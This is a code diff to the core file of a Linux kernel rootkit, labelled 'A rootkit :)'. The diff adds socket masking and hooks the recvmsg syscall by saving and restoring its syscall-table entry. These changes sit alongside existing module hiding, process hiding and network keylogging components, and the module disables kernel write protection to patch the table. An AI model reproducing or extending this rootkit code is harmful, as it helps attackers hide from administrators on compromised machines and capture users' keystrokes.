@@ -27,14 +27,15 @@
 
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 #include "module_masking.h"		/* Needed for ... */
-#include "process_masking.h"	/* Needed for ... */
 #include "network_keylogging.h"	/* Needed for ... */
+#include "process_masking.h"	/* Needed for ... */
+#include "socket_masking.h"		/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A rootkit :)");
 MODULE_VERSION("0.1");
-MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>") ;
+MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>");
 MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
 
 
@@ -51,11 +52,13 @@ MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
 #define PRINT(str) printk(KERN_INFO "rootkit core: %s\n", (str))
 #define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)
 
+
 /* Definition of global variables */
 void **syscall_table;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
 asmlinkage long (*original_readlinkat_syscall)(int , const char __user *, char __user *, int);
+asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);
 
 
 /* Declaration of functions */
@@ -81,10 +84,10 @@ static int __init module_masker_start(void)
 	original_read_syscall = (void *) syscall_table[__NR_read];
 	original_getdents_syscall = (void *) syscall_table[__NR_getdents];
 	original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
+	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];
 
 	/* Overwrite manipulated syscall */
-	//syscall_table[__NR_read] = (unsigned long *) my_read_syscall;
-	//syscall_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;
+	//...
 
 	enable_write_protect_mode();
 
@@ -92,6 +95,7 @@ static int __init module_masker_start(void)
 	module_masking_init(DEBUG_MODE_IS_ON);
 	network_keylogging_init(DEBUG_MODE_IS_ON);
 	process_masking_init(DEBUG_MODE_IS_ON);
+	socket_masking_init(DEBUG_MODE_IS_ON);
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -110,13 +114,14 @@ static void __exit module_masker_end(void)
 	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
 	syscall_table[__NR_getdents] = (unsigned long *) original_getdents_syscall;
 	syscall_table[__NR_readlinkat] = (unsigned long *) original_readlinkat_syscall;
+	syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;
 
 	enable_write_protect_mode();
 
+	socket_masking_exit();
 	process_masking_exit();
 	network_keylogging_exit();
 	module_masking_exit();
-
 
 	DEBUG_PRINT("successfully removed");
 
